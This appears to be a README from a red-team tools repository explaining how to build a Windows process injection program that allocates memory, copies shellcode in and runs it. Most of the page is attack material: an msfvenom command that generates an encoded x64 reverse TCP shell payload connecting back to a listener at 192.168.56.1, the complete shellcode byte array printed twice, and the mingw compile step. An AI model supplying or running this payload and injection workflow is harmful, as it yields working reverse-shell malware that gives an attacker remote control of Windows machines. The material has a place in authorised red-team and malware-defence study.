# Process injection

This is an example of how to execute a process injection in Windows. All the code used is in /Source_code, /Demo contains a recording of the code in execution.

The program will ask the Windows API to allocate some memory for a new process, copy the given shellcode into this memory, and execute it.

Obviously this won't bypass any antivirus on its own and Windows Defender is disabled for the demonstration, but it can be usefull once combined with other methods.

![Watch a demo here](https://raw.githubusercontent.com/geoffrey-diederichs/Red_team_tools/main/Process_injection/Demo/process_inj_demo.mp4)

## How to use

Replace <SHELLCODE_TO_REPLACE> within the process_injec.c at line 5 with the shellcode you want to execute. Then just compile and execute the program.

For example we can use msfvenom to generate a payload : 

```
$ msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4545 -e x64/xor -b "\x00\x0a\x0d" -f c
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 503 (iteration=0)
x64/xor chosen with final size 503
Payload size: 503 bytes
Final size of c file: 2144 bytes
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xa7\xbb\x02\x1d\x1c\x23\xa8\xab\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5b\xf3\x81"
"\xf9\xec\xcb\x68\xab\xa7\xbb\x43\x4c\x5d\x73\xfa\xfa\xf1"
"\xf3\x33\xcf\x79\x6b\x23\xf9\xc7\xf3\x89\x4f\x04\x6b\x23"
"\xf9\x87\xf3\x89\x6f\x4c\x6b\xa7\x1c\xed\xf1\x4f\x2c\xd5"
"\x6b\x99\x6b\x0b\x87\x63\x61\x1e\x0f\x88\xea\x66\x72\x0f"
"\x5c\x1d\xe2\x4a\x46\xf5\xfa\x53\x55\x97\x71\x88\x20\xe5"
"\x87\x4a\x1c\xcc\xa8\x28\x23\xa7\xbb\x02\x55\x99\xe3\xdc"
"\xcc\xef\xba\xd2\x4d\x97\x6b\xb0\xef\x2c\xfb\x22\x54\x1d"
"\xf3\x4b\xfd\xef\x44\xcb\x5c\x97\x17\x20\xe3\xa6\x6d\x4f"
"\x2c\xd5\x6b\x99\x6b\x0b\xfa\xc3\xd4\x11\x62\xa9\x6a\x9f"
"\x5b\x77\xec\x50\x20\xe4\x8f\xaf\xfe\x3b\xcc\x69\xfb\xf0"
"\xef\x2c\xfb\x26\x54\x1d\xf3\xce\xea\x2c\xb7\x4a\x59\x97"
"\x63\xb4\xe2\xa6\x6b\x43\x96\x18\xab\xe0\xaa\x77\xfa\x5a"
"\x5c\x44\x7d\xf1\xf1\xe6\xe3\x43\x44\x5d\x79\xe0\x28\x4b"
"\x9b\x43\x4f\xe3\xc3\xf0\xea\xfe\xe1\x4a\x96\x0e\xca\xff"
"\x54\x58\x44\x5f\x54\xa2\x54\xdb\x99\xf8\x88\x30\x1d\x1c"
"\x62\xfe\xe2\x2e\x5d\x4a\x9c\xf0\x83\xa9\xab\xa7\xf2\x8b"
"\xf8\x55\x9f\xaa\xab\xb6\x7a\xc2\xb5\x24\x22\xe9\xff\xee"
"\x32\xe6\x51\x95\xd2\xe9\x11\xeb\xcc\x24\x1a\xe3\xf6\xe4"
"\x22\x4d\xd3\x03\x1c\x1c\x23\xf1\xea\x1d\x92\x82\x76\x1c"
"\xdc\x7d\xfb\xf7\xf6\x33\xd4\x51\x12\x68\xe3\x58\x7b\x4a"
"\x94\xde\x6b\x57\x6b\xef\x32\xc3\x5c\xa6\xc9\xa7\x74\x47"
"\x44\xd7\x55\x95\xe4\xc2\xbb\xe6\xe3\x4e\x94\xfe\x6b\x21"
"\x52\xe6\x01\x9b\xb8\x68\x42\x57\x7e\xef\x3a\xc6\x5d\x1e"
"\x23\xa8\xe2\x1f\xd8\x6f\x79\x1c\x23\xa8\xab\xa7\xfa\x52"
"\x5c\x4c\x6b\x21\x49\xf0\xec\x55\x50\x2d\xe3\xc2\xa6\xfe"
"\xfa\x52\xff\xe0\x45\x6f\xef\x83\xef\x03\x1c\x54\xae\xec"
"\x8f\xbf\x7d\x02\x75\x54\xaa\x4e\xfd\xf7\xfa\x52\x5c\x4c"
"\x62\xf8\xe2\x58\x7b\x43\x4d\x55\xdc\x60\xe6\x2e\x7a\x4e"
"\x94\xdd\x62\x12\xd2\x6b\x84\x84\xe2\xc9\x6b\x99\x79\xef"
"\x44\xc8\x96\x12\x62\x12\xa3\x20\xa6\x62\xe2\xc9\x98\x58"
"\x1e\x05\xed\x43\xa7\xba\xb6\x15\x36\x58\x6e\x4a\x9e\xd8"
"\x0b\x94\xad\xdb\xb1\x82\xe6\xfc\x56\xad\x10\xe0\xa8\x70"
"\x72\x76\x23\xf1\xea\x2e\x61\xfd\xc8\x1c\x23\xa8\xab";
```

We can then place the shellcode inside process_inj.c and I'll use mingw-w64 to compile it for Windows under Linux :

```
$ cat process_inj.c | head -n 41 | tail -n 37
unsigned char shellcode[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xa7\xbb\x02\x1d\x1c\x23\xa8\xab\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5b\xf3\x81"
"\xf9\xec\xcb\x68\xab\xa7\xbb\x43\x4c\x5d\x73\xfa\xfa\xf1"
"\xf3\x33\xcf\x79\x6b\x23\xf9\xc7\xf3\x89\x4f\x04\x6b\x23"
"\xf9\x87\xf3\x89\x6f\x4c\x6b\xa7\x1c\xed\xf1\x4f\x2c\xd5"
"\x6b\x99\x6b\x0b\x87\x63\x61\x1e\x0f\x88\xea\x66\x72\x0f"
"\x5c\x1d\xe2\x4a\x46\xf5\xfa\x53\x55\x97\x71\x88\x20\xe5"
"\x87\x4a\x1c\xcc\xa8\x28\x23\xa7\xbb\x02\x55\x99\xe3\xdc"
"\xcc\xef\xba\xd2\x4d\x97\x6b\xb0\xef\x2c\xfb\x22\x54\x1d"
"\xf3\x4b\xfd\xef\x44\xcb\x5c\x97\x17\x20\xe3\xa6\x6d\x4f"
"\x2c\xd5\x6b\x99\x6b\x0b\xfa\xc3\xd4\x11\x62\xa9\x6a\x9f"
"\x5b\x77\xec\x50\x20\xe4\x8f\xaf\xfe\x3b\xcc\x69\xfb\xf0"
"\xef\x2c\xfb\x26\x54\x1d\xf3\xce\xea\x2c\xb7\x4a\x59\x97"
"\x63\xb4\xe2\xa6\x6b\x43\x96\x18\xab\xe0\xaa\x77\xfa\x5a"
"\x5c\x44\x7d\xf1\xf1\xe6\xe3\x43\x44\x5d\x79\xe0\x28\x4b"
"\x9b\x43\x4f\xe3\xc3\xf0\xea\xfe\xe1\x4a\x96\x0e\xca\xff"
"\x54\x58\x44\x5f\x54\xa2\x54\xdb\x99\xf8\x88\x30\x1d\x1c"
"\x62\xfe\xe2\x2e\x5d\x4a\x9c\xf0\x83\xa9\xab\xa7\xf2\x8b"
"\xf8\x55\x9f\xaa\xab\xb6\x7a\xc2\xb5\x24\x22\xe9\xff\xee"
"\x32\xe6\x51\x95\xd2\xe9\x11\xeb\xcc\x24\x1a\xe3\xf6\xe4"
"\x22\x4d\xd3\x03\x1c\x1c\x23\xf1\xea\x1d\x92\x82\x76\x1c"
"\xdc\x7d\xfb\xf7\xf6\x33\xd4\x51\x12\x68\xe3\x58\x7b\x4a"
"\x94\xde\x6b\x57\x6b\xef\x32\xc3\x5c\xa6\xc9\xa7\x74\x47"
"\x44\xd7\x55\x95\xe4\xc2\xbb\xe6\xe3\x4e\x94\xfe\x6b\x21"
"\x52\xe6\x01\x9b\xb8\x68\x42\x57\x7e\xef\x3a\xc6\x5d\x1e"
"\x23\xa8\xe2\x1f\xd8\x6f\x79\x1c\x23\xa8\xab\xa7\xfa\x52"
"\x5c\x4c\x6b\x21\x49\xf0\xec\x55\x50\x2d\xe3\xc2\xa6\xfe"
"\xfa\x52\xff\xe0\x45\x6f\xef\x83\xef\x03\x1c\x54\xae\xec"
"\x8f\xbf\x7d\x02\x75\x54\xaa\x4e\xfd\xf7\xfa\x52\x5c\x4c"
"\x62\xf8\xe2\x58\x7b\x43\x4d\x55\xdc\x60\xe6\x2e\x7a\x4e"
"\x94\xdd\x62\x12\xd2\x6b\x84\x84\xe2\xc9\x6b\x99\x79\xef"
"\x44\xc8\x96\x12\x62\x12\xa3\x20\xa6\x62\xe2\xc9\x98\x58"
"\x1e\x05\xed\x43\xa7\xba\xb6\x15\x36\x58\x6e\x4a\x9e\xd8"
"\x0b\x94\xad\xdb\xb1\x82\xe6\xfc\x56\xad\x10\xe0\xa8\x70"
"\x72\x76\x23\xf1\xea\x2e\x61\xfd\xc8\x1c\x23\xa8\xab";

$ x86_64-w64-mingw32-gcc process_inj.c -o process_inj.exe
```

The progam is now ready to be used, you can go watch the demo to see it being executed.
